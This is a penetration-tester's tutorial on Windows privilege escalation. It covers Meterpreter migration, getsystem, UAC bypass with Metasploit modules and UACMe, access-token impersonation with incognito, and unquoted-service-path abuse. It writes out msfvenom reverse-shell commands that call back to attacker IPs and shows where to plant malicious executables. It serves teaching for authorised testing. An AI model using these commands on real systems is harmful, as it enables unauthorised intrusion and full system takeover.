# Windows Privilege Escalation

This section explains ways we can elevate our privileges on a Windows system once we have exploited it. This is a part of the post exploitation phase of a test. We need to make sure that what we do is in scope, and that we record every change we make. These changes can then be included in the report so they can be reset if the client wants. The time and date that the changes are made should also be included in the report. If we make permanent changes to a machine, we need to keep a backup of the original data. This goes for logs, too - we need to make a backup copy of them before we delete them. We need to encrypt all data we capture from machines when it is stored locally on our attacking machines. Once the engagement is over, we need to securely wipe the data from our machines. When we give proof to a client of sensitive data we have found, we need to obfuscate it (usernames and passwords etc).

We can see the post exploitation stage of a penetration test as been cyclical. This process has stages: local enumeration of the compromised machine; optionally transferring files and upgrading shells; privilege escalation and establishing persistence; data harvesting; scanning internal networks and then the exploitation of new systems including pivoting to new sub-nets. As stated above, this section will focus on the privilege escalation part of the post exploitation phase of the test.

## Privilege Escalation Overview

Once we are on a machine, we will want to elevate our privilleges so that we can access more sensitive data. This can be achieved by exploiting vulnerabilities in operating systems or other software via bugs or design flaws. Priv esc can be vertical or horizontal (lateral). With horizontal priv esc, we move from one user to another who has the same level of system access. With vertical, we move from a lower user to a higher user (such as from a domain user to a domain admin on Windows). We can search for ways to escalate privileges and we can use local exploits to escalate privileges.

Privilege escalation depends very much on the environment which we find ourselves in when we land on a machine. This is why local enumeration is very important. When we land on a machine, we need to gather information about its system and users. This is the local enumeration part of post exploitation which needs to happen before we try to elevate our privileges.

Once we know what type of machine we are working with, we need to quickly try to establish persistence. This is because with some shells they can be closed by the remote user. This can easily happen with meterpreter shells, for example a remote user could close a browser which has established a meterpreter session via a client side exploit.

We can start to gain persistence by migrating our process to a different one. With meterpreter, we can use an automated way to do this: `run post/windows/manage/migrate` We can do this manually by first of all finding the process IDs of processes which are already running on the compromised machine. We can do this by using: `ps` We can filter the results by architecture using the `-A` flag and we can show only those processes which are running as `system` using the `-s` flag. An example is: `ps -A x86_64 -s` We can then choose a PID to migrate to (for example 1200) and use: `migrate 1200` We can find out which process id we are using with this command: `getpid` Processes such as `lsass` and `explorer` are good ones to migrate to as they are stable. We can quickly find the pid using: `pgrep explorer`

Once we have migrated to a different process, we need to think about how we can establish persistence. Most of the ways to do this require higher privileges, however, so we need to look for ways to do priv esc first. This is one reason privilege escalation is so important. It is also important because with higher level privileges we will be able to enumerate the victim machine more and potentially have access to more sensitive data - it is a crucial part of a penetration test.

There are many ways we can elevated privileges - this section deals with *some* of them in more depth.

## Bypassing Windows User Account Control

If we have gained a meterpreter session on a windows machine, a quick way to attempt to gain NT AUTHORITY\SYSTEM (the most powerful non-interactive session) is to use the command: `getsystem` though this does not always work and may well crash the remote machine so it needs to be used with caution.

This command tries different techniques to do priv esc. It only work on Windows. If we want to only try a specific way to do priv esc, we can use the `-t` flag along with the number of the technique: `getsystem -t 1`

One problem we may encounter is if *User Account Control* is enabled. We can find this out by using: `post/windows/gather/win_privs` If the UAC Enabled column is set to True, we will need to try to bypass this before running getsystem.

We will need to background the meterpreter session and then use: `search bypassuac` We can use the latest bypassuac module against the meterpreter session id: `use exploit/windows/local/bypassuac` followed by: `set session 2` or whatever session id we are targetting. If this works when we run it, a new meterpreter session will open. We will then be able to interact with it and try to run the `getsystem` command again.

Another way to attempt to bypass UAC via a meterpreter session is to background the session and then try: `use post/multi/recon/local_exploit_suggester` which will list various techniques we can try. We can try these in turn until we find one which works, for example: `use exploit/windows/local/bypassuac_dotnet_profiler`

### UAC

User Account Control is a security feature in windows which opens a prompt when a user attempts to execute a file or command which require elevated privileges.

If a low level user attempts this, the UAC credential prompt will ask for a local admin username:password and if a local admin account attempts it, the consent prompt will ask for confirmation. Either way, if we are interacting with the victim machine via a meterpreter or cmd session, we will not be able to continue as we will not be able to respond to the UAC prompt. This means we need to find ways to bypass UAC completely.

In order to do this, we will need to have a session for a user who is in the local admin group on the victim machine. The technique which we use to bypass UAC will depend on the OS version and build running on the victim machine.

### UACMe

UACMe is a tool we can find at [UACMe](https://github.com/hfiref0x/UACME) It has lots of ways to bypass UAC - we will need to find one which works for the windows environment we are targeting.

UACMe works by abusing the inbuilt Windows AutoElevate tool. It uses an executable called akagi. The binary will need to be compiled from the source code in the github repository as it is written mostly in C.

The akagi binary can be used to bypass UAC and then run another executable such as a malicious reverse shell. We can generate a reverse meterpreter shell using: `sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.8 LPORT=1234 -f exe > rs.exe`

We then need to transfer this reverse shell along with the akagi binary to the victim machine before starting a handler with msfconsole which uses the same payload as we used in the reverse shell: `set payload windows/meterpreter/reverse_tcp`

Once we have transfered the necessary files to the victim machine and started a handler, we can use: `.\Akagi64.exe 23 C:\Temp\rs.exe` (the first paramater passed to the akagi binary is the number of the exploit to try - this will depend on the environment we find on the vitim machine - 33 is a good one to try against windows 10 machines).

This will hopefully execute the reverse shell which has been specified as the second parameter with elevated privileges since UAC has been bypassed.

## Impersonatin User Access Tokens

Access tokens are created and managed by the Local Security Authority Subsystem Service. They are generated by the winlogon.exe process when users log into windows.

These tokens are attached to the userinit.exe process and contain data relating to the identity and privileges of the user account. All child processes started by a user will inherit a copy of the access token and therefore have the same privileges as the user. These tokens therefore control what users can access and not access on windows. They are like session cookies.

Access tokens have two types of security level - *impersonate* and *delegate* level tokens. The delegate tokens are more dangerous as they can be used to impersonate tokens on any system because they are generated as a result of an interactive login such as a normal log into windows or via RDP. Impersonate tokens are created as a result of non-interactive logins and can only be used to impersonate tokens on a local system.

In order to impersonate access tokens as a means of gaining an elevated session, the user we have gained an initial shell as needs to have specific privileges. The most useful of these is the `SeImpersonatePrivilege` which allows a user to create a process under the security context of another user which will typically have admin privileges. The `SeAssignPrimaryToken` lets users impersonate access tokens and the `SeCreateToken` lets users create arbitary tokens which have administrative privileges.

The access tokens which can be impersonated will depend on which tokens are available on the system. In order to find these, we can load the incognito module in a meterpreter session: `load incognito`

We will see the Delegation and Impersonate tokens which are available. If none are available, we can try a potato attack to create one. This section does not cover potato attacks - we are focusing on impersonating the tokens which are already available.

### Incognito Module

Once we have gained a meterpreter session, we can use: `load incognito` and then: `list_tokens -u` The `-u` flag is the user flag.

If we see a user we would like to impersonate, we can use: `impersonate_token "ATTACKDEFENCE\Administrator"`

We typically want to impersonate accounts which have higher privileges than our current session, but if there are other low-level user tokens available it can be useful to impersonate them for the purpose of horizontal movement across a system - we might find useful data or other priv esc opportunities when we have moved horizonally to a different user.

Once we have impersonated an access token, it could be useful to use: `list_tokens -u` again to see if any further access tokens such as `NT AUTHORITY\SYSTEM` are available as we can impersonate these newly available tokens, too.

## Unquoted Service Paths

Unquoted Service Path vulnerabilities abuse the way Windows searches for binaries when a service is started. They are found when a path to a binary contains spaces and has not been put into quotations.

First of all, we need to identify a vulnerable service. We can use automated tools such as *jaws.ps1* to do this, but we can do it manually, too. The manual way is to use wmic like so:

```shell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

We will need to make sure that we can stop and start the service as the user we have gained access to the victim system as. We can do this using `sc stop VulnService` and `sc start VulnService` We can check the state of a service using `sc query VulnService`

We also need to make sure that the vulnerable service starts as the *system* user. We can do this by running `sc qc VulnService` and looking at the SERVICE_START_NAME which will hopefully show as LocalSystem

Next, we need to stop the service and then check the permissions of the targeted directory where we aim to upload our malicious executable file. To do this, we can navigate to the parent directory of the targeted directory and run `icacls VulnDirectory` We are looking to see if we have the ability to write to the directory or to modify it. We will hopefully see `(M)` or `(W)`

Our task is to upload malware into the unquoted service path at a location which will be searched by Windows before the legitimate executable for the service is found. The malware will depend on the context of the compromised machine, but a simple example would be a reverse meterpreter shell generated using msfvenom:
```shell
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.46.6 LPORT=4445 --platform Windows -f exe > Vuln.exe
```

Assuming that we can write to the targeted directory, we can now upload our malware in the path of the service and give it a name which will be executed when the service starts.

When trying to work out where to place the malware, we can look for where there are spaces in the unquoted service path. Here is an example: `C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe` In this example, we could try to place our malware at the following path: `C:\Program Files\VMware\VMware.exe`

Here is another example of an unquoted service path: `C:\Program Files(x86)\Canon\IJ Scan Utility\SETEVENT.exe` We could try to place our malware at the following path: `C:\Program Files(x86)\Canon\IJ.exe`

We can now start a handler before starting the service on the victim machine. It might be that the shell is unstable, so we can migrate it to a different process when it starts by modifying the handler before running it using: `set AutoRunScript migrate -n svchost.exe` We could also use `set AutoRunScript migrate -f` to spawn a new *notepad* process which will be migrated to automatically.

Msfconsole also has a module we can use to automatically exploit unquoted service paths: `use exploit/windows/local/trusted_service_path`

## Conclusion

Once we land on a machine, finding a way to elevate our privileges is essential. It depends on thorough enumeration and perseverance.

> water shapes its course according to the nature of the ground over which it flows - the soldier works out his victory in relation to the foe whom he is facing

